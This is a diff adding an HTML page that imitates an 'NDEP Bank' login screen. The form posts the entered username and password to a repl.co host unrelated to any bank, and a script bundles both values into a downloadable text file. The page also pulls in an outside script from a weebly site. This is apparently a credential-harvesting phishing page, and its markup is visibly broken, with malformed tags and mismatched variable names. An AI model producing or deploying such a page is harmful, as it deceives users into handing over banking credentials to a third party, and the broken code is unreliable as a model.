@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<HTML>
+<HEAD>
+<META
+ <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>NDEP Bank</title>
+<link href="style.css" rel="stylesheet" type="text/css" 
+<TITLE> </TITLE>
+</HEAD>
+
+<BODY>
+    
+    
+    <center><img src="https://healthjournalism.org/blog/wp-content/uploads/2016/09/welcome.jpg">
+    <strong><center> Login </strong> <center>
+
+    <form action = "3f310a1b-6c63-474b-b006-603d83de2b01.repl.co"method="post">
+    Username: 
+    <br />
+    <input type="Username" name="username" id = "Username">
+    <br>
+    Password: 
+    <br />  
+    <input type="Password" name="password" id= "Password" />
+    <br /> 
+    <button onclick="saveFile()">Submit</button>
+    <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
+    <p><a href="reset.html">Forgot Password/Change Password </a>.</p>
+
+
+<script>
+    function getURL() {
+        alert("The URL of this page is: " + window.location.href);
+    }
+    </script>
+
+<script>
+    let saveFile = () => {
+    	
+        // Get the data from each element on the form.
+    	const name = document.getElementById('Username');
+        const age = document.getElementById('Password');
+        
+        
+        // This variable stores all the data.
+        let data = 
+            '\r Username: ' + Username.value + ' \r\n ' + 
+            'Password: ' +Password.value;
+        
+        // Convert the text to BLOB.
+        const textToBLOB = new Blob([data], { type: 'text/plain' });
+        const sFileName = 'formData.txt';	   // The file to save the data.
+
+        let newLink = document.createElement("a");
+        newLink.download = sFileName;
+
+        if (window.webkitURL != null) {
+            newLink.href = window.webkitURL.createObjectURL(textToBLOB);
+        }
+        else {
+            newLink.href = window.URL.createObjectURL(textToBLOB);
+            newLink.style.display = "none";
+            document.body.appendChild(newLink);
+        }
+
+        newLink.click(); 
+    }
+</script>  
+   
+    <p type="password"></p>
+
+
+    </form>
+
+    
+  <script type="text/javascript" src="https://ndep-bank.weeblysite.com/demo.html">
+
+    </script>
+    <script>
+        type = "text/javascript"
+        var _gaq = _gaq || [];
+        _gaq.push(['_setAccount', 'UA-1155620-6']);
+        _gaq.push(['_trackPageview']);
+
+        (function () {
+            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+            ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'
+            var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+        })();
+
+    </script>
+</BODY>
+
+</HTML>
